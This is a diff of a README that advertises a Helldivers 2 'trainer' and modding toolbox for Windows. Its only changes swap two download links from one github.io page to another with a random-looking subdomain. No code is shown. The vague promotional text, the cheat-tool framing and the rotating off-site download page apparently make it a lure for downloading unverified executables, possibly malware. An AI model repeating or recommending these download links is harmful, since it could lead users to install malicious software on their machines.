@@ -2,7 +2,7 @@
 
 This is a comprehensive modding and utility toolbox for **Helldivers 2**, designed for the Windows platform. The Helldivers 2 trainer 2026 project provides a suite of features to customize your gameplay, from managing ammunition to deploying stratagems with ease. It is your central hub for all Helldivers 2 modifications and gameplay enhancements on PC.
 
-[![Download Toolbox](https://img.shields.io/badge/Download-Toolbox_Latest-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Toolbox](https://img.shields.io/badge/Download-Toolbox_Latest-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -55,4 +55,4 @@ First, ensure Helldivers 2 is running and fully loaded into the main menu. Try r
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
